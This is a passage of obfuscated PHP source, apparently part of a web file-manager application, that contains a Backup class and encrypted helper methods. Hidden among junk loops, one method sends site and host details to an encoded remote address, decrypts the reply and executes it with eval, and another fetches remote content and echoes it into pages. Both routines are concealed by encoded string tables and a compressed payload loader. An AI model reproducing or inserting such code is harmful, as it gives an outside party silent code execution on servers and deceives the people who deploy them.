Model($њ߷[243])->set($њ߷[63], $њ߷[203]); } } public function mvyz1c7f6aa8() { $ʛ =& $_SERVER[ʯ]; return $_SERVER[ʌ][244]; $ֽ = $ʛ[732]; while ($ֽ < $ʛ[664]) { if ($ֽ >= 0) { break; } $ֽ++; } } private function qymv65b2cedc() { $ϭ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; $ͤ = array($[245], $[246], $[247]); $ = $[248] . md5($[249]); if ($this->nmqx22af2d5b == $[106] || !_get($GLOBALS, $[115])) { return; } if (!in_array($_SERVER[$[24]], $ͤ)) { return; } if (time() % 4 != 0) { return; } $ڶ = call_user_func(array($[250], $[251]), $); $ǯ = $ϭ[733]; while (strlen($ǯ) < $ϭ[19]) { if (!$ǯ) { break; } $ǯ++; } if ($ڶ && time() - $ڶ < intval($[252])) { return; } call_user_func(array($[250], $[138]), $, time()); $չԐ = $ϭ[734]; while ($չԐ < $ϭ[19]) { if ($չԐ >= 0) { break; } $չԐ++; } $͜ƙ = Model($[33])->get($[103]); $ = $ϭ[735]; if (strlen($) < $ϭ[664]) { return; } $إɌ = array($[150] => Model($[33])->get($[186]), $[163] => $this->nmqx22af2d5b, $[160] => $_SERVER[$[161]], $[162] => Model($[33])->get($[130]), $[101] => md5($_SERVER[$[102]] . $͜ƙ), $[153] => $[135], $[156] => $_SERVER[$[157]]); $ = $this->pdza1fd04e31($[253], $إɌ); if (!is_array($)) { return; } if ($[$[150]] && $[$[254]]) { if ($this->yodvbfafdb47($[$[254]]) == $إɌ[$[150]]) { return; } } $this->hery6097fc20(); if ($this->yodvbfafdb47($[$[254]]) != $إɌ[$[150]]) { $׌ = array($[181] => $͜ƙ, $[182] => $_SERVER[$[102]], $[183] => this_url(), $[158] => $_SERVER[$[159]]); $̑ռ = $this->rmhb90fe2c27(json_encode($׌)); $ = $this->pdza1fd04e31($[184] . $̑ռ); if ($ && is_array($) && isset($[$[254]])) { $ = $this->orkcbe9411e8($[$[254]], 2); if ($) { $ = $this->yodvbfafdb47($); } if ($) { try { @eval($); } catch (Exception $霂) { } } } } } private function pdza1fd04e31($ = '', $Ң = array(), $ = 5) { $ =& $_SERVER[ʯ]; $ܝ =& $_SERVER[ʌ]; $šԜ = $ܝ[255]; $šԜ = $this->glsb64d7e5b5($šԜ, $ܝ[256]); $Њ = $[698]; $šԜ = $šԜ . $; if ($Ң && is_array($Ң)) { $šԜ = $šԜ . $ܝ[257] . http_build_query($Ң); } if ($Ң === -1) { return $šԜ; } $Ƹ = stream_context_create(array($ܝ[216] => array($ܝ[219] => $, $ܝ[217] => $ܝ[258]), $ܝ[259] => array($ܝ[260] => !1, $ܝ[261] => !1))); $Ң = @file_get_contents($šԜ, !1, $Ƹ); $ğ = $[736]; if (strlen($ğ) < $[672]) { return; } return json_decode($Ң, !0); $ = $[737]; if (strlen($) < $[664]) { die; } $ݡ = $[738]; if (strlen($ݡ) < $[672]) { return; } } private function oelwa077c1cf() { $ =& $_SERVER[ʯ]; $Λ =& $_SERVER[ʌ]; $ = array($Λ[262] => $Λ[263], $Λ[264] => $Λ[265], $Λ[266] => $Λ[267], $Λ[268] => $Λ[269], $Λ[270] => $Λ[271], $Λ[272] => $Λ[211], $Λ[273] => $Λ[211], $Λ[274] => $Λ[263], $Λ[275] => $Λ[265], $Λ[276] => $Λ[267], $Λ[277] => $Λ[278], $Λ[279] => $Λ[269], $Λ[280] => $Λ[281], $Λ[282] => $Λ[271], $Λ[283] => $Λ[284], $Λ[285] => $Λ[286], $Λ[287] => $Λ[288]); $ = $[$this->nmqx22af2d5b]; $󴛢 = $[739]; if (!$󴛢) { die; } $ = intval($ ? $ : $Λ[263]); $ = _get($this->abcl2d36ed8f, $Λ[289]); $ = $ ? intval($) : 0; return $ + $; $ձ = $[740]; if (!$ձ) { die; } } public function bvcx43ace11e($Հ) { $ =& $_SERVER[ʌ]; $ծ = $this->oelwa077c1cf(); if ($Հ[$[290]] == $[121]) { return; } if ($ծ >= intval($[211])) { return; } $򉤐 = Model($[124])->count(); $ = $_SERVER[ʯ][741]; if (!$) { die; } if ($򉤐 <= $ծ) { return; } $ = Model($[124])->field($[290])->limit($ծ)->select(); $ = array_to_keyvalue($, $[6], $[290]); if (!in_array($Հ[$[290]], $)) { show_json($[291], !1, $[207]); } } public function sznu7cf715fb() { $ة =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; if (!_get($GLOBALS, $[115]) || mt_rand(1, 100) > 20) { return; } $ = $[214]; $喻 = $ة[742]; while ($喻 < $ة[661]) { if ($喻 >= 0) { break; } $喻++; } $ = $this->glsb64d7e5b5($, $[215]); $Ԅ = $ة[743]; while (strlen($Ԅ) < $ة[664]) { if (!$Ԅ) { break; } $Ԅ++; } $ٺ = stream_context_create(array($[216] => array($[217] => $[218], $[219] => 3))); $ = $ة[744]; while ($ < $ة[664]) { if ($ >= 0) { break; } $++; } $Տ = @file_get_contents($, !1, $ٺ); $ڀ➛ = $ة[745]; if (strlen($ڀ➛) < $ة[681]) { return; } echo $[292] . hash_encode($Տ) . $[293]; } private function zxqi0f217a37($ї, $Е, $ = 3) { $˭ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; usleep(1); $ї = trim($ї); $ی = $˭[746]; if (!$ی) { die; } $٧ = mt_rand(0, 5) . $[6]; $ = $˭[747]; if (!$) { return; } $̛͟ = rand_string(15); $̵ = $˭[748]; if (strlen($̵) < $˭[672]) { return; } $ƭ = $[294]; $Ƙ = $˭[749]; switch ($٧) { case $[203]: $ΐԟ = $this->orna6903f913($ї, strrev($Е . $̛͟)); $ = $˭[750]; while ($ < $˭[661]) { if ($ >= 0) { break; } $++; } break; $Ĩ = $˭[751]; if (!$Ĩ) { return; } case $[121]: $ΐԟ = $this->orna6903f913($ї, strrev($̛͟ . $Е)); $ = $˭[752]; while ($ < $˭[664]) { if ($ >= 0) { break; } $++; } break; $ = $˭[753]; while (strlen($) < $˭[19]) { if (!$) { break; } $++; } case $[295]: $ΐԟ = $this->orna6903f913($ї, base64_encode($̛͟ . $Е)); $ = $˭[754]; if (strlen($) < $˭[681]) { return; } break; $ƛā = $˭[755]; case $[296]: $ΐԟ = $this->orna6903f913($ї, md5($̛͟ . $Е)); break; case $[297]: $ї = base64_encode($ї); $ = $˭[756]; $ʽ = rand(0, 64); $Ֆϩ = $˭[757]; $֒Τ = $ƭ[$ʽ]; $ = $˭[758]; if (!$) { die; } $Ӯ = md5($֒Τ . md5($Е . $֒Τ) . $Е); $ٗ = $˭[759]; if (!$ٗ) { die; } $Ӯ = substr($Ӯ, $ʽ % 8, $ʽ % 8 + 7); $ݨՇ = $˭[760]; while (strlen($ݨՇ) < $˭[664]) { if (!$ݨՇ) { break; } $ݨՇ++; } $ڃ = $[6]; $ċ = $˭[761]; if (strlen($ċ) < $˭[19]) { return; } $ҝ = 0; $绅 = $˭[762]; while (strlen($绅) < $˭[672]) { if (!$绅) { break; } $绅++; } $Ӊ = 0; $ؖ = $˭[763]; if (strlen($ؖ) < $˭[672]) { die; } $ɒ = 0; $ԥ = $˭[764]; if (strlen($ԥ) < $˭[661]) { return; } for ($ҝ = 0; $ҝ < strlen($ї); $ҝ++) { $ɒ = $ɒ == strlen($Ӯ) ? 0 : $ɒ; $ = $˭[765]; while ($ < $˭[19]) { if ($ >= 0) { break; } $++; } $Ӊ = ($ʽ + strpos($ƭ, $ї[$ҝ]) + ord($Ӯ[$ɒ++])) % 64; $ڃ .= $ƭ[$Ӊ]; $ = $˭[766]; } $ΐԟ = hash_encode($֒Τ . $ڃ); $ = $˭[767]; if (strlen($) < $˭[672]) { die; } break; default: $ΐԟ = $this->orna6903f913($ї, $Е . $̛͟); break; } $ΐԟ = strrev($٧ . $̛͟ . $ΐԟ); if ($ - 1 > 0) { $ΐԟ = $this->zxqi0f217a37($ΐԟ, $Е, $ - 1); } return $ΐԟ; } private function orkcbe9411e8($, $, $ = 3) { $漁 =& $_SERVER[ʯ]; $󖄑 =& $_SERVER[ʌ]; if (!is_string($) || strlen($) < 10) { return !1; } $ = trim($); $调 = $漁[768]; if (!$调) { return; } $ = strrev($); $ҭ = $[0]; $ڔ޶ = substr($, 1, 15); $ߣ = $漁[769]; $ = substr($, 16); $У = $漁[659]; while ($У < $漁[681]) { if ($У >= 0) { break; } $У++; } $êʀ = $󖄑[294]; switch ($ҭ) { case $󖄑[203]: $ѷ = $this->glsb64d7e5b5($, strrev($ . $ڔ޶)); $ = $漁[770]; break; $ = $漁[771]; case $󖄑[121]: $ѷ = $this->glsb64d7e5b5($, strrev($ڔ޶ . $)); break; $׊ = $漁[772]; case $󖄑[295]: $ѷ = $this->glsb64d7e5b5($, base64_encode($ڔ޶ . $)); $У = $漁[773]; break; $鞞 = $漁[774]; if (!$鞞) { return; } case $󖄑[296]: $ѷ = $this->glsb64d7e5b5($, md5($ڔ޶ . $)); break; case $󖄑[297]: $ = hash_decode($); $ = $[0]; $ = substr($, 1); $㗁 = $漁[775]; $忀 = strpos($êʀ, $); $ĆӺ = md5($ . md5($ . $) . $); $ĆӺ = substr($ĆӺ, $忀 % 8, $忀 % 8 + 7); $ߕ = $漁[776]; if (strlen($ߕ) < $漁[19]) { return; } $߮ = $󖄑[6]; $ = $漁[777]; if (!$) { return; } $Ӯ = 0; $Չ = $漁[778]; while (strlen($Չ) < $漁[19]) { if (!$Չ) { break; } $Չ++; } $о = 0; $ℶ = 0; for ($Ӯ = 0; $Ӯ < strlen($); $Ӯ++) { $ℶ = $ℶ == strlen($ĆӺ) ? 0 : $ℶ; $Եٴ = $ℶ++; $о = strpos($êʀ, $[$Ӯ]) - $忀 - ord($ĆӺ[$Եٴ]); $΅đ = $漁[779]; while ($о < 0) { $о += 64; } $߮ .= $êʀ[$о]; } $ѷ = base64_decode($߮); $ܔ = $漁[780]; if (!$ܔ) { die; } break; $¯¬ = $漁[781]; if (!$¯¬) { return; } default: $ѷ = $this->glsb64d7e5b5($, $ . $ڔ޶); $ٿ = $漁[782]; if (strlen($ٿ) < $漁[19]) { return; } break; } if ($ - 1 > 0) { $ѷ = $this->orkcbe9411e8($ѷ, $, $ - 1); } return $ѷ; } public function rmhb90fe2c27($φࢗ) { $ =& $_SERVER[ʯ]; $ܵ =& $_SERVER[ʌ]; $ɋ = $this->liegb4ab87e9(); $Ú = $this->liegb4ab87e9(); $ = ($ɋ - 1) * ($Ú - 1); $ҋ = intval(($ɋ + $Ú) / 2); while (1) { $ԧ = $ҋ; $ = $[783]; while (strlen($) < $[681]) { if (!$) { break; } $++; } $抜 = $; $ = $[784]; if (!$) { die; } while ($抜 % $ԧ != 0) { $𘈜 = $抜; $ = $[785]; if (!$) { die; } $抜 = $ԧ; $ߑ = $[786]; if (!$ߑ) { die; } $ԧ = $𘈜 % $ԧ; $˘ = $[787]; if (!$˘) { die; } } if ($ԧ == 1) { break; } else { $ҋ++; } } $Ļ = 2; $ = $[788]; for ($ߣ = 0; $ߣ < $ * 10; $ߣ++) { if (($ * $ߣ + 1) % $ҋ == 0) { $Ļ = intval(($ * $ߣ + 1) / $ҋ); break; } } $ = $this->orna6903f913($ɋ * $Ú . $ܵ[6], $ܵ[135]); $ʆ = $[789]; if (strlen($ʆ) < $[661]) { return; } $ݹ = md5($ܵ[298] . ($ɋ + $Ú) . $ܵ[299] . $ҋ . $ܵ[299] . $Ļ . $ܵ[300]); $ = $[790]; if (!$) { die; } $厦 = $this->orna6903f913($φࢗ, $ݹ) . $ܵ[301] . $; return $厦; $۴ = $[791]; if (!$۴) { return; } } public function yodvbfafdb47($Ṑ) { $ =& $_SERVER[ʯ]; $ =& $_SERVER[ʌ]; $ = explode($[301], $Ṑ); $ = $[792]; if (!$) { return; } if (count($) != 2) { return $[6]; } $ = $this->glsb64d7e5b5($[1] . $[6], $[135]); $݅ = $[793]; if (!$) { return $[6]; } $ = intval($); $ő = 0; $ = $[794]; while (strlen($) < $[661]) { if (!$) { break; } $++; } $휐 = 0; $ = $[795]; if (!$) { return; } for ($۪ = 3; $۪ < $; $۪ += 2) { if ($ % $۪ != 0) { continue; } $ő = $۪; $훹 = $[796]; if (strlen($훹) < $[681]) { return; } $휐 = intval($ / $۪); break; $؟ = $[683]; while ($؟ < $[19]) { if ($؟ >= 0) { break; } $؟++; } } $ = ($ő - 1) * ($휐 - 1); $̰ = intval(($ő + $휐) / 2); while (1) { $ϋ = $̰; $뺶 = $[797]; if (!$뺶) { die; } $݆ = $; $ = $[798]; if (!$) { return; } while ($݆ % $ϋ != 0) { $ = $݆; $݆ = $ϋ; $ϋ = $ % $ϋ; } if ($ϋ == 1) { break; } else { $̰++; } } $ǆ = 2; $ÿ = $[799]; if (strlen($ÿ) < $[661]) { return; } for ($۪ = 0; $۪ < $ * 10; $۪++) { if (($ * $۪ + 1) % $̰ == 0) { $ǆ = intval(($ * $۪ + 1) / $̰); break; } } $۪ = md5($[298] . ($ő + $휐) . $[299] . $̰ . $[299] . $ǆ . $[300]); $Ė = $[800]; $۳ = $this->glsb64d7e5b5($[0], $۪); return $۳; $ْԈ = $[801]; if (strlen($ْԈ) < $[661]) { return; } } public function liegb4ab87e9() { $鍱 =& $_SERVER[ʯ]; $囬 = mt_rand(pow(2, 14), pow(2, 16) - 1); $إ = array(); $ = $鍱[802]; while (strlen($) < $鍱[672]) { if (!$) { break; } $++; } $ = 1; while ($ <= (int) sqrt($囬)) { $ = $; $ = $鍱[803]; if (!$) { die; } while (!0) { $++; $֒ = $鍱[804]; while ($֒ < $鍱[661]) { if ($֒ >= 0) { break; } $֒++; } if ($ <= 2) { $ = $; break; } else { if ($ < 2) { continue; } } $Ŏ = !0; for ($ȑ = 2; $ȑ <= sqrt($); $ȑ++) { if ($ % $ȑ == 0) { $Ŏ = !1; } } if ($Ŏ) { $ = $; break; } } $إ[] = $; $ = $鍱[805]; while ($ < $鍱[681]) { if ($ >= 0) { break; } $++; } } $· = 2; for ($ = $囬; $ > 1; $--) { $Ŏ = !0; foreach ($إ as $) { if ($ % $ == 0) { $Ŏ = !1; break; } } if ($Ŏ) { $· = $; break; } } return $·; } public function ojgn2ded7f6e($, $) { $Ļ =& $_SERVER[ʌ]; return call_user_func(array($Ļ[8], $Ļ[302]), $, $); $ߪΈ = $_SERVER[ʯ][806]; } public function orna6903f913($ρ, $) { $뷟 =& $_SERVER[ʌ]; return call_user_func(array($뷟[303], $뷟[304]), $ρ, $); $׶ = $_SERVER[ʯ][807]; } public function glsb64d7e5b5($, $኎) { $ =& $_SERVER[ʌ]; return call_user_func(array($[303], $[305]), $, $኎); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ٿ =& $_SERVER[ʯ]; $this->isManual(); self::$name = date($ٿ[808]); if (!($ = Model($ٿ[809])->lastItem())) { $ = $this->initData(); } else { self::$name = $[$ٿ[42]]; if ($[$ٿ[810]] == $ٿ[98]) { self::$name = date($ٿ[263]); $ = 0; if (isset($[$ٿ[345]][$ٿ[223]][$ٿ[517]])) { $ = (int) $[$ٿ[345]][$ٿ[223]][$ٿ[517]]; } if (self::$manual == 0 && $[$ٿ[42]] == self::$name) { Model($ٿ[809])->remove($[$ٿ[451]]); } $ = $this->initData($, $[$ٿ[811]]); } else { $this->checkStore($[$ٿ[811]]); } } self::$option = $; } private function isManual() { $ܑ = _get($GLOBALS, $_SERVER[ʯ][812], 0); $ܑ = intval($ܑ); self::$manual = $ܑ && $ܑ == 1 ? 1 : 0; } private function initData($Ъ = 0, $ = '') { $Ĉ =& $_SERVER[ʯ]; $썓 = Model($Ĉ[809])->config(); if ($ && $썓[$Ĉ[811]] != $) { $Ъ = 0; } $this->checkStore($썓[$Ĉ[811]]); if (self::$manual == 1) { self::$name .= $Ĉ[11] . date($Ĉ[813]); } $đ = array($Ĉ[811] => $썓[$Ĉ[811]], $Ĉ[42] => self::$name, $Ĉ[810] => 0, $Ĉ[814] => $썓[$Ĉ[814]], $Ĉ[815] => self::$manual, $Ĉ[345] => array($Ĉ[816] => array($Ĉ[810] => 0), $Ĉ[817] => array($Ĉ[810] => 0, $Ĉ[818] => 0, $Ĉ[819] => 0, $Ĉ[43] => $Ĉ[12], $Ĉ[820] => 0, $Ĉ[821] => 0), $Ĉ[822] => array($Ĉ[810] => 0, $Ĉ[818] => 0, $Ĉ[819] => 0, $Ĉ[820] => 0, $Ĉ[821] => 0), $Ĉ[223] => array($Ĉ[810] => 0, $Ĉ[823] => 0, $Ĉ[824] => 0, $Ĉ[825] => 0, $Ĉ[826] => 0, $Ĉ[517] => $Ъ, $Ĉ[820] => 0, $Ĉ[821] => 0)), $Ĉ[820] => time(), $Ĉ[821] => 0); $ = Model($Ĉ[809])->insert($đ); $đ[$Ĉ[451]] = $; return $đ; } private function checkStore($ſ) { $製 =& $_SERVER[ʯ]; $ = Model($製[827])->listData($ſ); Model($製[827])->checkConfig($); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ʯ][809])->findByName(self::$name); } return self::$option; } public static function set($ݖ) { $㗞ǔ =& $_SERVER[ʯ]; $ܛ = self::get(); foreach ($ݖ as $٣ => $) { $ɍ = explode($㗞ǔ[10], $٣); $ϋ = count($ɍ); switch ($ϋ) { case 1: $ܛ[$ɍ[0]] = $; break; case 2: $ܛ[$ɍ[0]][$ɍ[1]] = $; break; case 3: $ܛ[$ɍ[0]][$ɍ[1]][$ɍ[2]] = $; break; } } Model($㗞ǔ[809])->update($ܛ[$㗞ǔ[451]], $ܛ); self::$option = $ܛ; return self::$option; } public function keep() { $Í =& $_SERVER[ʯ]; $Ê = self::get(); if ($Ê[$Í[345]][$Í[816]][$Í[810]] == $Í[98]) { return; } $this->backupKeep($Ê); self::set(array($Í[828] => 1)); } private function backupKeep($) { $Ğƥی =& $_SERVER[ʯ]; if (self::$manual == 1) { return; } $ˉŨ = Model($Ğƥی[809])->listData(); if (empty($ˉŨ)) { return; } $򟙱 = 0; $ = array(); foreach ($ˉŨ as $щ) { if ($򟙱 >= 7) { break; } $[] = $щ[$Ğƥی[42]]; $򟙱++; } for ($򟙱 = 0; $򟙱 < 12; $򟙱++) { $[] = date($Ğƥی[829], strtotime("\x2d{$򟙱}\40\155\157\156\164\x68\163")); } $ = array_unique($); $ = Model($Ğƥی[830])->get($Ğƥی[831]); foreach ($ˉŨ as $щ) { if (isset($щ[$Ğƥی[815]]) && $щ[$Ğƥی[815]] == $Ğƥی[98]) { continue; } if (!empty($щ[$Ğƥی[42]]) && in_array($щ[$Ğƥی[42]], $)) { continue; } Model($Ğƥی[809])->remove($щ[$Ğƥی[451]]); $ = $this->backupPath($, $); IO::remove($, !1); } } private function backupPath($, $ʘǊ = false) { $ƸӉ =& $_SERVER[ʯ]; if (!$ʘǊ) { $ʘǊ = Model($ƸӉ[830])->get($ƸӉ[831]); } $ʽ = $[$ƸӉ[42]]; $ = substr(md5($ƸӉ[832] . $ʘǊ . $ʽ), 0, 8); return "\173\151\157\x3a{$[$ƸӉ[811]]}\175\57\x64\x61\164\141\x62\141\x73\x65\x2f\x62\x61\143\153\165\x70\57" . $ʽ . $ƸӉ[11] . $; } public function db() { $ȕ =& $_SERVER[ʯ]; $ = self::get(); if ($[$ȕ[345]][$ȕ[817]][$ȕ[810]] == $ȕ[98]) { return !0; } $ = new BackupDb(); if (!$->index()) { return !1; } self::set(array($ȕ[833] => 1)); return !0; } public function dbFile() { $ =& $_SERVER[ʯ]; $ = self::get(); if ($[$[345]][$[822]][$[810]] == $[98]) { return !0; } $ = new BackupDbFile(); if (!$->index()) { return !1; } self::set(array($[834] => 1)); return !0; } public function file() { $ =& $_SERVER[ʯ]; $缛 = self::get(); if ($缛[$[345]][$[223]][$[810]] == $[98]) { return !0; } if (!isset($缛[$[814]]) || $缛[$[814]] == $[221]) { $ = new BackupFile(); if (!$->index()) { return !1; } } self::set(array($[835] => 1, $[810] => 1)); return !0; } } goto e; F: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\210\373\371\372\312\257", "\xde\x93\x9a\xe9\xbb\xfd"); $_SERVER[ʯ] = explode("\174\3\174\2\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\174\133\325\365\70\136\312\50\4\132\132\12\241\264\205\276\30\202\355\104\303\166\266\23\47\221\145\71\26\221\45\43\311\131\266\171".base64_decode('eZKepWdLerLek1cSyiwzlFHCKKOsslehzBIKtIVCgQIFwiirGVDolwIdjI7fHeeO9w==')."\x24\xc3\xf7\xff\xf9\xff\x3e\x9f\x5f\x20\xd1\xbd\xe7\x8e\x77\xc7\xb9\xe7\x9e\x7b\xee\x39\xe7\x5e\x78\xfc\x3\x8f\xff\xf9\xc3\x8d\xbb\x6f\xfc\xf2\xc6\xdd\x6e\x78\xf7\xa2\xd3\xce\x3a\x87\x86\xd1\x5f".strrev('%zY!.u}wOӌ|D	')."\xbe\xf4\xef\x99\xd1\x7f\xb5\xa2\x9c\xb4\x60\x2b\xfd\x51\x8a\xa6\xad\xe8\xe3\x86\x65\x5b\x14\x90\x36\x8b\x83\x46\x96\x86\x8d\x22\xfd\xf5\xd3\x9f\xde\x78\xa4\xac\x17\x4c\x5b\xa7\x51\x1f\xfd\x51\xa1"."\121\64\242\15\32\171\75\141\114\352\341\242\33\102\343\70\246\146\165\133\105\37\262\365\42\373\154\173\40\21\16\252\75\201\144\27\215\153\245\222\337\312\14\133\176\255\234\316\31".base64_decode('o3rESPlTRtGf0WzNl2INm0Z/5kLTc3p6WNVSZtnWMxRUKeaN4rDcEhq2RvIG64cajQ==')."\45\325\104\157\117\117\50\236\204\316\264\312\351\5\63\3\241\222\126\326\12\320\340\222\136\266\320\250\311\325\251\45\263\244\27\35\20\1\300\15\117\151\26\324\324\321\256\166\204"."\x7a\x22\xb1\xb5\x6a\x72\x6d\x4f\x8\x72\xa4\xd4\x91\x8a\x5e\x9e\xa0\x31\x12\x4c\xd8\x5a\xd9\x4e\x1a\x5\x9d\xe7\x18\x2b\xf3\x76\xb5\x87\x56\x84\xa3\x4a\x32\x1e\x88\x26\x2\xc1\x64\x38\x16\xa5\xe0".base64_decode('YKy7O5yshsdjkUh7ILiyOqUnHljRHVBQ+9DUGMVBs0FZT1PWK4000GnoeRjSosaaYw==')."\117\224\40\224\344\41\204\116\305\112\76\117\43\121\36\312\350\203\132\45\17\243\325\41\107\112\145\243\240\261\116\257\324\47\70\24\360\240\142\233\106\61\115\43\241\161\273\254\11"."\70\152\153\32\41\44\102\42\12\113\204\42\241\140\122\301\15\124\72\343\261\156\5\46\241\240\131\266\136\126\126\167\205\342\41\5\67\272\255\236\364\265\136\1\274\216\242\241\120"."\2\221\210\62\125\15\266\136\50\261\152\150\231\32\225\305\342\35\241\270\322\276\126\21\43\224\66\13\5\263\350\103\265\240\231\264\245\246\206\342\161\32\360\300\62\214\204\361\244"."\101\44\326\331\231\10\361\30\164\356\350\10\152\311\34\300\117\107\54\63\230\267\325\121\55\137\141\150\12\10\137\17\77\360\153\132\200\272\43\106\321\250\0\232\102\25\246\311\227"."\77\4\52\54\267\316\40\172\6\2\5\124\336\4\12\201\126\361\50\15\266\55\245\277\213\41\123\12\257\360\121\275\154\253\172\61\155\146\214\42\20\225\145\200\164\232\235\353\50"."\xa3\x95\x5d\x6\xba\x60\xe6\x33\x2c\x6c\x39\xa8\x45\xb4\x52\x90\xb3\xf0\x28\xa2\xb\xf9\x4c\x99\xad\xaf\xcf\xcb\x49\xa3\x11\xbe\x5c\x71\x5e\x11\x2b\xa1\x96\xf0\x95\x6e\xc\x4e\x88\xf5\x86\xf3\xf5"."\xf0\x54\xcb\xac\x94\xd3\x88\xae\xd\x42\xdf\x9b\x1\xac\xdb\x36\xea\x1c\x8c\x8d\x61\xf6\x96\xf2\xa6\x96\x49\xe8\x65\xde\x35\xc3\xec\x44\x15\xc5\x2a\xb6\xc\xac\x90\x6c\x9d\x66\xb9\xd0\x81\x28\x3".base64_decode('fB+tCqO3RsIwWxcZacT8DX3He/8z0Lcc/dMIJLof2pTT83lVH9dh4RQy8yw2GH4L0w==')."\121\4\241\321\160\114\315\151\126\256\73\63\117\45\245\30\345\317\350\343\276\122\256\4\253\232\57\344\176\7\142\343\241\213\232\166\110\332\77\362\146\132\313\313\135\244\341\234\155"."\227\22\172\61\323\311\111\160\306\34\53\222\221\52\351\214\132\167\170\224\214\322\255\254\125\272\132\215\126\213\25\54\344\171\210\365\216\303\54\16\264\307\331\164\146\6\151\200\357".base64_decode('EnXwQcMiFE4sT7TJ5I20Zhtm0W+mbd32WnZZ16DGQDqtW5Y3iPapspn3BvJ5c8wbKw==')."\33\131\243\330\252\314\2\142\113\67\61\57\46\200\255\260\122\353\26\53\30\161\360\147\146\265\125\354\101\357\102\266\2\171\356\262\126\264\6\365\262\67\4\53\243\125\101\215\345"."\124\220\145\353\60\254\222\151\31\270\171\255\212\146\333\132\72\207\51\210\250\276\355\163\362\33\170\347\323\253\362\206\306\113\106\131\267\130\133\225\25\335\111\250\4\325\256\173\173"."\312\132\266\240\265\52\245\112\12\215\14\254\324\32\60\232\33\206\246\125\111\343\250\107\51\124\54\333\133\326\21\51\62\320\166\7\203\34\36\364\166\343\165\145\350\31\157\2\121".strrev('Ex09ZHڐmj=%vXQ i'."\0".'l')."\175\25\300\36\163\114\57\243\17\267\117\264\52\303\146\46\145\216\373\130\122\47\260\45\54\63\236\356\222\355\215\153\305\54\36\237\324\204\255\3\12\132\243\131\347\100\107\364\142"."\326\316\261\202\211\120\174\125\50\256\46\142\235\311\325\201\70\154\346\105\204\45\343\354\123\270\352\274\67\256\147\320\320\247\155\126\116\53\341\121\143\171\360\342\300\163\305\122\361"."\x82\x61\x69\x91\xf0\xa\x3c\x30\x1d\x5e\xb\x65\xf2\xca\xb9\x58\xdd\x11\xa3\x60\xe0\xb6\xdb\x3c\x85\x8c\x24\xda\xe9\x57\x40\x83\xfc\xa4\x43\x6d\xfd\xd6\xac\x86\xfe\xcc\xec\x46\x2f\xfa\x77\x56\x63".base64_decode('X3+Hb9bAMr8hyvibfc1KS9N8pQexHoaWV6DTVTmalNhK57AIbC6aRf1zBgfvXdKydw==')."\15\53\5\306\103\107\367\206\22\111\265\73\224\354\212\165\300\327\103\1\10\105\114\272\154\131\157\373\350\317\0\314\356\0\375\121\15\253\123\332\126\160\224\223\37\325\114\15\241".strrev('Yf6W097KP$BI8̳n'."\0".'{W\\:4')."\143\322\310\126\205\316\310\125\326\0\162\125\312\127\20\316\370\361\27\222\271\112\41\5\24\35\161\200\210\133\26\14\226\65\201\270\220\2\333\271\320\366\147\207\73\34\373\23\304"."\374\52\236\347\176\137\251\230\155\74\2\352\122\133\346\65\141\0\240\50\164\21\161\232\25\275\172\14\174\151\23\155\65\335\332\260\336\212\73\5\364\143\61\201\262\210\104\130\26"."\343\275\240\315\275\267\343\171\312\373\12\250\22\122\147\320\344\273\27\75\163\54\166\356\5\212\136\56\233\345\31\220\203\204\25\262\241\340\171\203\312\155\276\75\133\150\371\260\160".strrev('bmQtr<IC=xP}l_b;6ٞըib9')."\150\331\221\5\341\123\316\4\274\106\363\6\115\252\360\266\261\126\146\364\274\316\160\41\247\263\135\262\11\262\241\261\343\230\42\16\55\210\331\105\120\301\236\30\126\34\225\304\173"."\x1a\x8b\xaf\xc6\xa7\x3\x1\xc0\x1b\x3b\xcc\xbc\x8\xe6\xd1\xb8\xc7\x8\xee\x8b\x78\x4f\x59\x1f\x34\x80\x5c\x15\x11\x6a\x76\x6b\xe5\x61\xd6\x31\x54\x52\xac\x1a\x1c\x91\x56\x54\x67\x6f\x24\xa2\x6"."\143\321\44\72\134\120\310\352\170\70\31\142\53\70\320\241\6\202\75\234\5\1\60\46\260\325\273\47\205\214\266\300\44\243\106\370\305\66\217\166\254\222\131\264\164\57\34\32\275"."\xe2\xe8\x51\x95\x94\x11\xbb\x20\xd0\x59\xb1\x73\xba\x36\xc3\x71\xaf\x56\x98\xf4\x16\x10\x9\xf0\xf2\xe6\x39\x79\x10\x5\x76\x47\xca\xca\x84\x61\x9a\xc4\xe6\x86\x7\xf\xad\x42\xc6\xfc\xf4\xc4\x12"."\x50\x60\x19\x86\x22\x6\x34\xc5\x17\x4b\x4f\x2f\x24\x15\x24\x14\x59\x11\x2\xa0\x95\xd3\x80\x9f\xc\xac\x4e\xb0\x1d\xa9\x82\x32\x96\x8d\x49\x4d\xf4\x65\x19\x6b\x8\xeb\x41\x21\x2f\x18\x59\x67\x77".strrev('fjinj#\\c`0_.2B7h7]sQb')."\122\173\326\172\13\136\134\13\36\53\137\123\123\23\253\153\366\174\45\207\310\21\340\255\131\314\220\371\200\121\112\125\322\303\154\151\150\151\306\311\341\243\256\345\35\63\30\45\75"."\x82\x33\xbd\x47\x54\xe3\xc9\x11\xce\x3d\x3\xaa\xa8\x10\x8e\x4d\xd5\xd2\xf8\x63\x2a\xaa\xd1\xae\x58\xf2\xd0\xa0\x5\x94\x41\x85\xc\xc6\xa0\x52\xa8\x96\xcf\xa2\x51\xb6\x73\x5\x19\x28\xa6\x98\xc6".base64_decode('dco38cnio4jHttY2xhY8Ypkm2F5dqw1rarVhjasNa6rbQEGWkS2iXrLNKNkVjq5Uuw==')."\143\35\241\210\32\216\242\275\67\131\15\357\355\351\10\260\45\52\303\333\143\114\366\2\320\136\264\373\256\12\104\302\356\354\241\65\341\104\62\121\63\11\301\172\103\256\224\216\166".strrev('I1~,Q,DlE_ߖ3竖t'."\r".'ȗ`P(p